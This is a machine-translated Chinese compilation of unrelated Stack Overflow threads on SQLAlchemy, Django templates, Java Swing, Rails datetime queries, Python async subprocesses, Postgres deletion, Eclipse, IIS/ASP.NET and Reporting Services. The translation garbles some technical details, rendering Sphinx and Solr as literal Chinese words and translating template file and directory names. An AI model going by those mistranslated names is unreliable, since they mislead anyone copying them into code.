> 时间：2021-12-14T16:55:30.240

```
every_column = User.__table__.columns
records = session.query(*every_column).filter(User.foo==1).all() 
```

当 ORM 类被传递给查询函数时，例如`query(User)`，结果将由 ORM 实例组成。在大多数情况下，这是开发人员想要并且最容易处理的 - 上面与此方法相对应的答案的受欢迎程度证明了这一点。

在某些情况下，开发人员可能想要[一个可迭代的值序列](https://stackoverflow.com/questions/636548/select-in-sqlalchemy/70352670#comment17034585_636631)。在这些情况下，可以将所需列对象的列表传递给`query()`. 这个答案显示了如何在不硬编码的情况下传递整个列列表，同时仍然在 ORM 层使用 SQLAlchemy。

# django - 如何使项目模板和 Satchmo 模板共存？

> ID：636549
> 
> 赞同：2
> 
> 时间：2009-03-11T21:57:20.497
> 
> 标签：django, django-templates, satchmo

我正在使用现有项目中的 Satchmo 安装。这个项目有它自己的模板以及一些已安装的各种应用程序的模板。其中一些特定于应用程序的模板有自己的 app_base.html 变体，这些变体期望从 base.html 派生。我希望能够对我的 Satchmo 模板做同样的事情，并将它们驻留在我的项目的基础中，但还可以在所有这些模板周围添加一些额外的 html。

*   /模板
    *   base.html
    *   索引.html
    *   /消息
        *   news_base.html（扩展 base.html 并添加特定于新闻的模板功能）
        *   索引.html
        *   详细信息.html
    *   /店铺
        *   base.html（覆盖 Satchmo 的基础）

这种结构有些作用，但不是我所期望的。在 /store/base.html（Satchmo 的基础）中，我只是用测试消息替换了所有内容。我可以看到该消息，所以我知道 satchmo 正在加载其基础而不是站点的基础。但是，我不能再扩展我的项目的基础，因为使用：

```
{% extends "base.html %} 
```

产生一个递归错误，因为它调用自己，下面的根本行不通。

```
{% extends "../base.html" %} 
```

我意识到我可以将我的项目的 base.html 更改为稍微不同的名称，并将所有特定于应用程序的模板指向它们，但这似乎是对模板结构的这样一个基本方面的一个相当大的 hack。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-12T01:15:23.470

嗯，我不认为 django 相对那样查找模板。

有点疯狂的黑客，但这应该工作：

*   `/templates/store/base.html`延伸`"global_base.html"`
*   `/templates/global_base.html`延伸`"base.html"`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-06-27T22:41:18.993

根据您设置模板结构的方式，使用 settings.TEMPLATE_LOADERS 变量可能也是一个好主意。

> TEMPLATE_LOADERS 默认值：('django.template.loaders.filesystem.load_template_source', 'django.template.loaders.app_directories.load_template_source') 知道如何从各种来源导入模板的可调用元组（作为字符串）。请参阅 Django 模板语言：适用于 Python 程序员。

有关这如何影响模板加载过程的更多信息：http: [//docs.djangoproject.com/en/dev/ref/templates/api/#loader-types](http://docs.djangoproject.com/en/dev/ref/templates/api/#loader-types)

从您描述问题的方式来看，似乎通过注释掉“app_directories.load_template_source”文件行，您可能能够更好地找到一种方法来完成您正在做的事情。

> django.template.loaders.app_directories.load_template_source 从文件系统上的 Django 应用程序加载模板。对于 INSTALLED_APPS 中的每个应用程序，加载程序都会查找模板子目录。如果该目录存在，Django 会在其中查找模板。
> 
> 这意味着您可以将模板与您的个人应用程序一起存储。这也使得使用默认模板分发 Django 应用程序变得容易。
> 
> 例如，对于此设置：
> 
> INSTALLED_APPS = ('myproject.polls', 'myproject.music') ...然后 get_template('foo.html') 将按以下顺序在这些目录中查找模板：
> 
> /path/to/myproject/polls/templates/foo.html /path/to/myproject/music/templates/foo.html 请注意，加载器在首次导入时会执行优化：它缓存了一个列表，其中包含 INSTALLED_APPS 包模板子目录。
> 
> 默认情况下启用此加载程序。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-11-03T22:54:15.640

我刚遇到同样的问题。看起来 satchmo 开发人员计划为此在商店模板目录中放置一个“空”基础。虽然这可能与您不再相关，但我希望在这里看到这一点。

您可以在模板目录中创建一个“shop”目录，然后将 main satchmo base.html 复制到该目录。

这对我有用。

# java - Java Component.show() / hide() 已弃用...为什么？

> ID：636550
> 
> 赞同：18
> 
> 时间：2009-03-11T21:57:20.497
> 
> 标签：java, swing, deprecated

有谁知道这些 Java swing 方法被弃用的原因：

```
Component.show(); 
Component.hide(); 
```

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-03-12T00:24:22.453

JDK 1.1 引入了 Java Bean。Java Bean 依靠反射和自省来确定 Bean 的属性是什么（Bean 是“组件”）。属性然后显示在属性表中。

默认情况下，bean 使用以下格式：

```
boolean isXXX()
<type> getXXX()
void setXXX(<type>) 
```

（在接下来的两个记忆中......它们用于索引属性）

```
<type> getXXX(int)
void setXXX(<type>, int) 
```

您可以覆盖默认值，但大多数事情只是依赖命名模式而不是这样做。

所以 show/hide 不符合命名模式并被替换为 setVisible(boolean) 。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-03-11T21:58:56.687

很可能是因为它们不符合标准的 get/set 命名方案（[他们](http://java.sun.com/javase/6/docs/api/java/awt/Component.html#hide()) [说](http://java.sun.com/javase/6/docs/api/java/awt/Component.html#show())，“从 JDK 版本 1.1 开始，被替换为[`setVisible(boolean)`](http://java.sun.com/javase/6/docs/api/java/awt/Component.html#setVisible(boolean))”）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-11T21:59:49.943

从 JDK 版本 1.1 开始，由 Component.setVisible(boolean) 取代。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-12-01T01:12:02.403

您可以使用替代方案：`someUseFrame.setVisible(true);`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T22:00:01.113

java.awt.Component 的 hide 和 show 方法已经被弃用了一段时间。

设置组件可见性的正确方法是 setVisible(boolean b)

# .net - 全文搜索的替代品

> ID：636551
> 
> 赞同：0
> 
> 时间：2009-03-11T21:57:47.203
> 
> 标签：.net, sql-server, sql-server-2005, full-text-search

我不是使用 MSSQL 进行全文搜索的忠实粉丝（不确定是否还有其他）有人知道对此有任何其他选择吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-03-11T21:58:33.690

**[来自 Apache 的Lucene.Net](http://incubator.apache.org/lucene.net/)**值得一看。

> 在您的原始文本数据被索引后，您可以使用 Lucene.Net 的 API 来搜索这些数据。通过 Lucene.Net 的 API 进行索引和搜索既简单又非常强大。

[演示和故障](http://www.aspfree.com/c/a/BrainDump/Working-with-Lucene-dot-Net/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2011-02-09T19:55:34.640

Lucene 是一个低级应用程序。您获得了所有控制权，但您必须编写大量代码才能使用它制作可用的应用程序。

Solr 基于 Lucene，但为您提供了更加友好的 http 界面。它非常可配置，但需要一些学习才能设置。

狮身人面像值得回顾。它不是最受欢迎的，但有一些不错的功能。

如果您不想管理自己的服务器，有一个托管版本的 Solr，称为 webSolr。仍然具有与太阳能相同的灵活性/学习曲线，减去设置服务器。

最后，但我个人的偏好（这里完全有偏见）是 IndexTank。它像 websolr 一样托管，但有免费计划，实时运行良好（sorl 可能需要一些调整才能做到这一点），并且允许您调整与自定义编写函数的相关性，而无需重新索引。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-31T04:27:24.910

那里有一些替代品。我暂时想不出任何人的名字。

然而，SQL Server 2008 中的全文搜索进行了重大改进。您可能需要考虑升级以获得速度改进。

# sql - 如何正确转换或查询 Rails / MySQL DateTime 列的日期范围

> ID：636553
> 
> 赞同：6
> 
> 时间：2009-03-11T21:57:59.340
> 
> 标签：sql, mysql, ruby-on-rails, ruby, datetime

我有一个 Rails 应用程序，我将 created_at 存储为日期时间（标准）。我正在构建一个用于搜索的表单，我发现我必须使用 find_by_sql 来执行一些复杂的子查询。该表单有一个日期范围（没有时间）来搜索 items created_at 字段。

我发现的问题是，如果我只传入日期字符串以供查询范围......

```
... status_changes.created_at between '2009-01-24' and '2009-03-12' ... 
```

我正在取回 created_at 日期为 2009-01-23 17:10:39 -0800 的记录，因为它以 2009-01-24 01:10:39 (UTC) 的形式存储在数据库中

我该如何解决这个问题，以便结果不会返回有问题的记录？

看来我要么需要将日期范围转换为特定于 UTC，要么告诉 find_by_sql 根据当前时区进行搜索，而不是将列读取为 utc ...

有接盘侠吗？

约翰

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-03-13T05:03:39.463

这样做的现代 ActiveRecord 方法是：

```
Model.where(time_field: date1..date2) 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-03-12T13:58:45.927

如果您不使用`find_by_sql`，而是使用`find`带有`:conditions`让 Rails 进行替换的子句，它将自动转换所有内容。

```
Model.find :all, 
  :conditions => ["created_at between ? and ?", start_date, end_date] 
```

最坏的情况，如果 Rails 被日期弄糊涂了，你可以将它们转换为时间，它应该会很好地发挥作用：

```
Model.find :all, 
  :conditions => ["created_at between ? and ?", 
                   start_date.to_time, end_date.to_time] 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2010-05-20T12:46:25.973

我知道这是一个老问题，但在回答 Streamlines 关于 CONVERT_TZ 的查询时：

除非您加载了 mySQL 命名的时区表（这在 vanilla 安装中不太可能），否则您需要输入时区作为与 UTC 的偏移量。

```
CONVERT_TZ(status_changes.created_at, '+00:00', '+08:00') between '2009-01-24' and '2009-03-12') 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T22:23:39.123

MySQL 有一个[CONVERT_TZ](http://dev.mysql.com/doc/refman/5.1/en/date-and-time-functions.html#function_convert-tz)函数，它接受一个日期时间并将其从一个时区转换为另一个时区。您可以构建查询以将存储值 (UTC) 转换为本地时区 (PST)。

```
CONVERT_TZ(status_changes.created_at,'UTC',?) between ? and ?, 'PST, '2009-01-24', '2009-03-10' 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-08-02T06:51:17.053

我尝试了伊恩的回答，但效果不佳。Rails 在保存和加载记录时正确处理时区，但对查询参数似乎没有做同样的事情。请注意，我正在处理的应用程序是在 Rails 2.1.1 中，所以从那时起情况可能有所改善。

通过一个小的调整，我能够使 Ian 的解决方案发挥作用：使用 getutc 方法获取 UTC 时区的时间值，然后将其作为参数传递。这也不会对可能正确处理时间参数区域的任何更高版本的 Rails 造成任何损害，因为 getutc 不会更改 UTC 时间，而只会更改时区。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-09-09T17:10:23.653

因为 Rails 以 UTC 格式将日期存储在数据库中，所以您应该使用`utc`方法 on`Time`或`DateTime`

IE

```
Model.find :all, 
  :conditions => ["created_at between ? and ?", start_date.utc, end_date.utc] 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2012-04-17T21:44:40.657

```
Model.where(:from => "2012-01-01".to_date.."2012-06-30".to_date) 
```

为我工作（ :from 是“日期”类型的数据库字段）

# python - 如何从 Python 异步运行外部命令？

> ID：636561
> 
> 赞同：149
> 
> 时间：2009-03-11T22:01:42.733
> 
> 标签：python, asynchronous, subprocess, scheduler

我需要从 Python 脚本异步运行 shell 命令。我的意思是我希望我的 Python 脚本在外部命令关闭并执行它需要做的任何事情时继续运行。

我读了这篇文章：

> [在 Python 中调用外部命令](https://stackoverflow.com/questions/89228/how-to-call-external-command-in-python)

然后我开始进行一些测试，看起来`os.system()`可以完成我在命令末尾使用的工作，`&`这样我就不必等待它返回。我想知道这是否是完成此类事情的正确方法？我试过`commands.call()`了，但它对我不起作用，因为它阻止了外部命令。

请让我知道是否`os.system()`建议使用此方法，或者我是否应该尝试其他路线。

* * *

## 回答 #1

> 赞同：159
> 
> 时间：2009-03-11T22:05:32.613

[`subprocess.Popen`](http://docs.python.org/library/subprocess.html)做你想要的。

```
from subprocess import Popen
p = Popen(['watch', 'ls']) # something long running
# ... do other stuff while subprocess is running
p.terminate() 
```

（编辑以完成评论中的答案）

Popen 实例可以执行各种其他操作，例如[`poll()`](http://docs.python.org/library/subprocess.html#subprocess.Popen.poll)查看它是否仍在运行，您可以[`communicate()`](http://docs.python.org/library/subprocess.html#subprocess.Popen.communicate)使用它在标准输入上向其发送数据，并等待它终止。

* * *

## 回答 #2

> 赞同：58
> 
> 时间：2009-03-11T22:15:50.373

如果您想并行运行多个进程，然后在它们产生结果时处理它们，您可以使用轮询，如下所示：

```
from subprocess import Popen, PIPE
import time

running_procs = [
    Popen(['/usr/bin/my_cmd', '-i %s' % path], stdout=PIPE, stderr=PIPE)
    for path in '/tmp/file0 /tmp/file1 /tmp/file2'.split()]

while running_procs:
    for proc in running_procs:
        retcode = proc.poll()
        if retcode is not None: # Process finished.
            running_procs.remove(proc)
            break
        else: # No process is done, wait a bit and check again.
            time.sleep(.1)
            continue

    # Here, `proc` has finished with return code `retcode`
    if retcode != 0:
        """Error handling."""
    handle_results(proc.stdout) 
```

那里的控制流有点复杂，因为我试图让它变小——你可以根据自己的喜好进行重构。:-)

**这具有首先服务于早期完成请求的优点。**如果您调用`communicate`第一个正在运行的进程并且结果证明它运行时间最长，那么当您本可以处理它们的结果时，其他正在运行的进程将一直处于空闲状态。

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2020-04-16T15:52:47.670

这在“等待命令异步终止”下的[Python 3 子进程示例中有所介绍。](http://queirozf.com/entries/python-3-subprocess-examples#wait-for-command-to-terminate-asynchronously)`IPython`使用or运行此代码`python -m asyncio`：

> ```
> import asyncio
> 
> proc = await asyncio.create_subprocess_exec(
>    'ls','-lha',
>    stdout=asyncio.subprocess.PIPE,
>    stderr=asyncio.subprocess.PIPE)
> 
> # do something else while ls is working
> 
> # if proc takes very long to complete, the CPUs are free to use cycles for 
> # other processes
> stdout, stderr = await proc.communicate() 
> ```

该过程将在`await asyncio.create_subprocess_exec(...)`完成后立即开始运行。如果在您调用时它还没有完成`await proc.communicate()`，它将在那里等待以便为您提供输出状态。如果已经完成，`proc.communicate()`将立即返回。

这里的要点类似于[Terrels 的答案](https://stackoverflow.com/a/57187166/974555)，但我认为 Terrels 的答案似乎使事情过于复杂。

有关[`asyncio.create_subprocess_exec`](https://docs.python.org/3/library/asyncio-subprocess.html#asyncio.create_subprocess_exec)更多信息，请参阅。

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2009-03-11T22:24:32.567

**我想知道的是，这 [os.system()] 是否是完成此类事情的正确方法？**

不 `os.system()`，不是正确的方法。这就是为什么每个人都说使用`subprocess`.

有关更多信息，请阅读[http://docs.python.org/library/os.html#os.system](http://docs.python.org/library/os.html#os.system)

> subprocess 模块提供了更强大的工具来生成新进程并检索它们的结果；使用该模块优于使用此功能。使用子流程模块。尤其要检查用子流程模块替换旧功能部分。

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2019-07-24T16:07:32.233

接受的答案*很*老了。

我在这里找到了一个更好的现代答案：

[https://kevinmccarthy.org/2016/07/25/streaming-subprocess-stdin-and-stdout-with-asyncio-in-python/](https://kevinmccarthy.org/2016/07/25/streaming-subprocess-stdin-and-stdout-with-asyncio-in-python/)

并做了一些改动：

1.  让它在windows上工作
2.  使其与多个命令一起使用

```
import sys
import asyncio

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

async def _read_stream(stream, cb):
    while True:
        line = await stream.readline()
        if line:
            cb(line)
        else:
            break

async def _stream_subprocess(cmd, stdout_cb, stderr_cb):
    try:
        process = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )

        await asyncio.wait(
            [
                _read_stream(process.stdout, stdout_cb),
                _read_stream(process.stderr, stderr_cb),
            ]
        )
        rc = await process.wait()
        return process.pid, rc
    except OSError as e:
        # the program will hang if we let any exception propagate
        return e

def execute(*aws):
    """ run the given coroutines in an asyncio loop
    returns a list containing the values returned from each coroutine.
    """
    loop = asyncio.get_event_loop()
    rc = loop.run_until_complete(asyncio.gather(*aws))
    loop.close()
    return rc

def printer(label):
    def pr(*args, **kw):
        print(label, *args, **kw)

    return pr

def name_it(start=0, template="s{}"):
    """a simple generator for task names
    """
    while True:
        yield template.format(start)
        start += 1

def runners(cmds):
    """
    cmds is a list of commands to excecute as subprocesses
    each item is a list appropriate for use by subprocess.call
    """
    next_name = name_it().__next__
    for cmd in cmds:
        name = next_name()
        out = printer(f"{name}.stdout")
        err = printer(f"{name}.stderr")
        yield _stream_subprocess(cmd, out, err)

if __name__ == "__main__":
    cmds = (
        [
            "sh",
            "-c",
            """echo "$SHELL"-stdout && sleep 1 && echo stderr 1>&2 && sleep 1 && echo done""",
        ],
        [
            "bash",
            "-c",
            "echo 'hello, Dave.' && sleep 1 && echo dave_err 1>&2 && sleep 1 && echo done",
        ],
        [sys.executable, "-c", 'print("hello from python");import sys;sys.exit(2)'],
    )

    print(execute(*runners(cmds))) 
```

示例命令不太可能在您的系统上完美运行，并且它不会处理奇怪的错误，但此代码确实演示了一种使用 asyncio 运行多个子进程并流式传输输出的方法。

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2009-03-11T23:04:44.390

我在[asyncproc](http://www.lysator.liu.se/~bellman/download/asyncproc.py)模块上取得了很好的成功，它很好地处理了进程的输出。例如：

```
import os
from asynproc import Process
myProc = Process("myprogram.app")

while True:
    # check to see if process has ended
    poll = myProc.wait(os.WNOHANG)
    if poll is not None:
        break
    # print any new output
    out = myProc.read()
    if out != "":
        print out 
```

* * *

## 回答 #7

> 赞同：7
> 
> 时间：2010-07-06T14:30:28.793

将[pexpect](https://pexpect.readthedocs.io/en/stable/)与非阻塞 readlines 一起使用是另一种方法。Pexpect 解决了死锁问题，允许您轻松地在后台运行进程，并提供简单的方法来在您的进程吐出预定义的字符串时进行回调，并且通常使与进程的交互更加容易。

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2017-08-06T11:53:19.057

考虑到“我不必等待它返回”，最简单的解决方案之一是：

```
subprocess.Popen( \
    [path_to_executable, arg1, arg2, ... argN],
    creationflags = subprocess.CREATE_NEW_CONSOLE,
).pid 
```

但是...从我读到的内容来看，这不是“完成此类事情的正确方法”，因为`subprocess.CREATE_NEW_CONSOLE`标志会带来安全风险。

这里发生的关键事情是`subprocess.CREATE_NEW_CONSOLE`用于创建新的控制台和`.pid`（返回进程 ID，以便您以后可以根据需要检查程序），以便不等待程序完成其工作。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2009-06-06T10:07:22.427

我在尝试使用 Python 中的 s3270 脚本软件连接到 3270 终端时遇到了同样的问题。现在我正在用我在这里找到的一个 Process 子类来解决这个问题：

[http://code.activestate.com/recipes/440554/](http://code.activestate.com/recipes/440554/)

这是从文件中获取的样本：

```
def recv_some(p, t=.1, e=1, tr=5, stderr=0):
    if tr < 1:
        tr = 1
    x = time.time()+t
    y = []
    r = ''
    pr = p.recv
    if stderr:
        pr = p.recv_err
    while time.time() < x or r:
        r = pr()
        if r is None:
            if e:
                raise Exception(message)
            else:
                break
        elif r:
            y.append(r)
        else:
            time.sleep(max((x-time.time())/tr, 0))
    return ''.join(y)

def send_all(p, data):
    while len(data):
        sent = p.send(data)
        if sent is None:
            raise Exception(message)
        data = buffer(data, sent)

if __name__ == '__main__':
    if sys.platform == 'win32':
        shell, commands, tail = ('cmd', ('dir /w', 'echo HELLO WORLD'), '\r\n')
    else:
        shell, commands, tail = ('sh', ('ls', 'echo HELLO WORLD'), '\n')

    a = Popen(shell, stdin=PIPE, stdout=PIPE)
    print recv_some(a),
    for cmd in commands:
        send_all(a, cmd + tail)
        print recv_some(a),
    send_all(a, 'exit' + tail)
    print recv_some(a, e=0)
    a.wait() 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2020-01-15T08:43:47.263

这里有几个答案，但没有一个能满足我的以下要求：

1.  我不想等待命令完成或用子进程输出污染我的终端。

2.  我想使用重定向运行 bash 脚本。

3.  我想在我的 bash 脚本中支持管道（例如`find ... | tar ...`）。

满足上述要求的唯一组合是：

```
subprocess.Popen(['./my_script.sh "arg1" > "redirect/path/to"'],
                 stdout=subprocess.PIPE, 
                 stderr=subprocess.PIPE,
                 shell=True) 
```

# sql - 如何安全地从数据库中删除一行？

> ID：636566
> 
> 赞同：5
> 
> 时间：2009-03-11T22:03:09.420
> 
> 标签：sql, postgresql

出于合规性原因，当我从当前项目的数据库中删除用户的个人信息时，需要真正、不可恢复地删除相关行。

我们使用的数据库是postgres 8.x，

除了定期运行 COMPACT/VACUUM 之外，我还能做些什么吗？

值得庆幸的是，我们的备份将由其他人持有，并且允许他们保留已删除的信息。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-11T22:06:59.053

“不可恢复的删除”比听起来更难，并且超出了您的数据库。例如，您是否计划返回磁带/备份上所有以前的数据库实例，该行也存在，并在那里删除它？

考虑您之前提到的定期删除和定期 VACUUMing。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-11T22:07:29.707

你备份你的数据库吗？- 如果是，请确保您也将其从备份中删除。

是因为安全风险吗？在这种情况下，我会更改行中的数据，然后删除该行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T22:15:00.970

也许我的想法有点偏离，但你真的想这样删除用户吗？大多数身份和访问管理方法建议将用户留在身边但处于标记为已删除状态，以免失去审计能力（该用户在过去五年中做了什么）？

出于完整性合规性原因或恶意黑帽目的，可能需要删除用户信息。在这两种情况下，都没有一种删除方法可以保证不会留下用户存在的痕迹，正如其他帖子中所指出的那样。

也许您应该详细说明为什么需要这种不可撤销的删除...？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T22:23:31.430

为了完成 ACID 中的“D”，关系数据库使用事务日志类型系统来更改数据库。当进行删除时，将对数据的内存副本（缓冲区高速缓存）进行删除，然后以同步模式写入事务日志文件。如果数据库崩溃，事务日志将被重放以使系统恢复到正确的状态。因此，删除存在于必须删除的多个位置。只有在稍后的某个时间，才会从磁盘上的实际数据文件（以及任何索引）中“删除”记录。此时间量因数据库而异。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-11T22:10:16.253

这不是您可以在软件方面做的事情。真正删除它是一个硬件问题，您需要物理销毁驱动器。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-11T22:31:36.623

用随机字符/日期/数字等覆盖记录怎么样？

# eclipse - Eclipse 可以突出显示无法访问的代码吗？

> ID：636567
> 
> 赞同：1
> 
> 时间：2009-03-11T22:03:19.063
> 
> 标签：eclipse

例如，我有一个 if 子句，它总是错误的（不是变量是最终的），例如：

```
public static final boolean FOO = false;
if (FOO) { 
    doSomething(); 
} 
```

例如，我希望它在 Eclipse 中以灰色显示。所以基本上我希望它能够像 Visual C++ 一样为无法访问的宏执行此操作。

更新：我希望它能够实时显示，就像 Eclipse 在您更改代码时一直编译 Java 一样。这应该是可能的，不是吗？我知道之后有那些死代码工具可以做到这一点，但这不是我喜欢做的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T22:11:38.933

你可以试试

*   [查找错误](http://findbugs.sourceforge.net/)
*   [不必要的代码检测器插件](http://www.ucdetector.org/index.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-11T22:34:09.487

下一个版本的 Eclipse (3.5) 将具有此功能。

它目前从 3.5 里程碑 4 开始可用，如[Eclipse 3.5 M4 - New and Noteworthy中所列](http://download.eclipse.org/eclipse/downloads/drops/S-3.5M4-200812111908/eclipse-news-M4.html)

您现在可以使用最新的里程碑（3.5M5）获得它

从[Eclipse 下载页面下载](http://download.eclipse.org/eclipse/downloads/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T22:10:30.027

首先，您应该意识到这是一种无法计算的东西。如果您不熟悉此主题，请查看[停机问题。](http://en.wikipedia.org/wiki/Halting_problem)

其次，有一些插件可以帮助识别死代码，达到一定的可计算限制，例如[**PMD**](http://pmd.sourceforge.net/)。

# c# - 如何使用 C# 确定虚拟目录或网站的 ASP.NET 版本？

> ID：636569
> 
> 赞同：2
> 
> 时间：2009-03-11T22:04:50.400
> 
> 标签：c#, asp.net, iis, directoryservices

如何找出在 C# 中使用的 IIS 虚拟目录的 .NET 框架。我需要向用户展示它。

```
using System.DirectoryServices;
using System.IO;

private enum IISVersion
{
    IIS5,
    IIS6
}

private void ReadVirtualDirectory(string server, string directory, IISVersion version)
{
    string siteID = string.Empty;
    string path = string.Empty;

    switch(verison)
    {
        case IISVersion.IIS5:
            path = string.Format("IIS://{0}/W3SVC/1/Root", server);

            if(!string.IsNullOrEmpty(directory))
            {
                path = string.Concat(path, "/", directory);
            }

            break;

        case IISVersion.IIS6:
            path = string.Format("IIS://{0}/W3SVC", server);

            if(!string.IsNullOrEmpty(directory))
            {
                DirectoryEntry de = new DirectoryEntry(path);

                foreach(DirectoryEntry child in de.Children)
                {
                    if(child.Properties["ServerComment"].Value.ToString().ToLower() == directory)
                    {
                        siteID = child.Name;
                        break;
                    }
                }

                path = string.Concat(path, "/", siteID);

                de.Close()
                de = null;
            }

            break;
    }

    DirectoryEntry iis = new DirectoryEntry(path);

    //display iis properties here...
    //need to display if the virtual directory is running under .NET 1.1 or 2.0

    iis.Close();
    iis = null;       
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-11T22:56:41.087

它可能不是最漂亮的方法，但如果您可以获取并解析**aspnet_regiis.exe -lk**的输出，您将获得所需的所有信息。SharePoint VHD 的输出示例：

```
C:\WINDOWS\Microsoft.NET\Framework\v2.0.50727>aspnet_Regiis -lk
W3SVC/  1.1.4322.2407
W3SVC/1/ROOT/Reports/   2.0.50727.0
W3SVC/1/ROOT/ReportServer/      2.0.50727.0
W3SVC/1619303638/Root/  2.0.50727.0
W3SVC/1619303638/Root/_layouts/images/  1.1.4322.2407
W3SVC/1619303638/Root/_layouts/inc/     1.1.4322.2407
W3SVC/1720207907/root/  2.0.50727.0
W3SVC/1720207907/root/SharedServices1/  2.0.50727.0
W3SVC/1848312571/Root/  2.0.50727.0
W3SVC/1848312571/Root/_layouts/images/  1.1.4322.2407
W3SVC/1848312571/Root/_layouts/inc/     1.1.4322.2407
W3SVC/784543535/Root/   2.0.50727.0
W3SVC/784543535/Root/_layouts/images/   1.1.4322.2407
W3SVC/784543535/Root/_layouts/inc/      1.1.4322.2407
W3SVC/98413328/Root/    2.0.50727.0
W3SVC/98413328/Root/_layouts/images/    1.1.4322.2407
W3SVC/98413328/Root/_layouts/inc/       1.1.4322.2407 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-03-11T23:29:45.360

在 IIS 中，没有硬性和快速的方法来找出网站或“虚拟”目录（网站应用程序文件夹 - 以 cogs 作为图标的文件夹）使用哪个 ASP.NET 版本。

原因是 IIS 和元数据库只知道脚本映射而不知道 ASP.NET 版本（毕竟 ASP.NET 只是另一个 ISAPI 应用程序）。确定 ASP.NET 版本的一种方法是使用如下内容：

```
using System;
using System.DirectoryServices;
namespace ConsoleApplication1
{
    class Program
    {
        static void Main(string[] args)
        {
            string path = @"IIS://Localhost/W3SVC/1/root/MyApp";
            Console.WriteLine(GetAspNetVersion(path));
        }

        private static string GetAspNetVersion(string path)
        {
            using (DirectoryEntry app = new DirectoryEntry(path))
            {
                PropertyValueCollection pvc = app.Properties["ScriptMaps"];

                foreach (string scriptMap in pvc)
                {
                    if (scriptMap.StartsWith(".aspx"))
                    {
                        string[] mapping = scriptMap.Split(',');
                        string scriptProcessor = mapping[1];

                        // The version numbers come from the path
                        // C:\Windows\Microsoft.NET\Framework\
                        // which will be present in the script processor 
                        // DLL path
                        if (scriptProcessor.Contains("v1.1.4322"))
                        {
                            return "1.1";
                        }

                        if (scriptProcessor.Contains("v2.0.50727"))
                        {
                            return "2.0";
                        }
                    }
                }
                throw new Exception("Unknown version ASP.NET version.");
            }
        }
    }
} 
```

这并不理想，但并没有满足我们作为供应应用程序/服务的托管者的需求。我怀疑 IIS MMC 插件在幕后执行了类似的检查。我自己对元数据库（基于 Windows 2000 和 Windows 2003 文件的 XML）的详细检查表明，没有存储特定 ASP.NET 版本号的显着属性/属性。

# reporting-services - 在 Microsoft Reporting Services 中创建计算行的总和

> ID：636573
> 
> 赞同：4
> 
> 时间：2009-03-11T22:06:34.997
> 
> 标签：reporting-services, sum

这似乎应该很简单，但我还找不到任何东西。在 Reporting Services 中，我有一个最多包含 6 行的表，这些行都具有计算值和动态可见性。我想总结这些行。基本上我有一些发票项目，并想总计。我无法更改数据库端的任何内容，因为我的存储过程在系统的其他地方使用。每行也从不同的数据集中提取数据，因此我无法对数据集进行求和。我可以用表格页脚对所有行求和吗？类似于汇总 Excel 中的行数？将每一行的可见性表达式放入页脚行来计算总和似乎非常多余。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-03-11T22:40:14.277

有几种方法可以实现这一目标：

**1.**在 SQL 中进行计算并对该字段求和，如下所示：

```
SELECT Quantity, Amount, Quantity * Amount As TotalAmount FROM MyTable 
```

然后只需使用 Detail 行中的 TotalAmount 字段并将其汇总在页脚中。

**2.**创建第二个数据集，为您计算总数并在页脚中使用它而不是总和：

```
=Sum(Fields!TotalAmount.Value, "MyTotalingDataset") 
```

**3.**使用自定义代码执行此操作。右键单击布局空间选择属性，然后单击代码选项卡。放入以下代码：

```
Public Dim TotalAmount As Double = 0

Public Function CalculateRowTotal(ThisValue As Double, ThatValue As Double) As Double
    TotalAmount = TotalAmount + (ThisValue * ThatValue)
    Return ThisValue * ThatValue
End Function 
```

在详细信息带上，使您对字段求和的列具有以下表达式：

```
=Code.CalculateRowTotal(Fields!Quantity.Value, Fields!Amount.Value) 
```

这将执行上面的代码并进行计算并计算过程中的总和。

页脚区域显示总和，因此该列具有以下表达式：

```
=Code.TotalAmount 
```

你完成了。请注意，因为您不能保证代码执行的顺序，并且对于某些报告，它将首先执行页脚（例如，如果您使用详细信息带中的行的总和），这将使总数为零因为细节带计算还没有发生，但对于一般情况，这应该有效。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-20T08:28:52.877

您可以按如下方式更改数据库。

您是否知道**无需**聚合数据即可在 SQL 中获得聚合结果？

